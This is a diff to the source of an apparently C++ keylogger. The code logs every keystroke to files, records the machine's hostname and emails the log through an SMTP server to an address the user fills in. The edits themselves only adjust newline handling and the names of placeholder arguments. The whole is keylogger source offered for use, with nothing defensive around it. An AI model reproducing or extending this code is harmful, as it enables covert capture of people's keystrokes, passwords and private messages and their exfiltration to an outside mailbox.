@@ -24,8 +24,6 @@ int main()
     logEmail.open("emailfilename.txt");/*Change this to the file you want to email*/
     logHistory.open("Histroyfilename.txt", ios_base::out | ios_base::app);/*change this to the file you want to keep your key log history on*/
 
-    logKey("\n");/*Start key logging on a new line*/
-
     while(log == enable)
     {
         for (int i = 0; i < 256; i++)
@@ -44,7 +42,7 @@ int main()
         }
     }
 
-    logKey("\n[END OF SESSION]");
+    logKey("\n[END OF SESSION]\n");
 
     logEmail.close();
     logHistory.close();
@@ -59,7 +57,7 @@ int main()
     subject += hostname;
     cout << subject;
 
-    Email email("ANYNAME", "TOname@domain.com", subject, "ANYNAME");/*REPLACE with your data ANYNAME, TOname,*/
+    Email email("From", "TOname@domain.com", subject, "Body");/*REPLACE with your data From, TOname, subject(optional), Body*/
     email.send("smtp://smtp.domain.com:587", "username", "password", "filename.txt");/*REPLACE with your data domain, username, password, and filename*/
 }
   
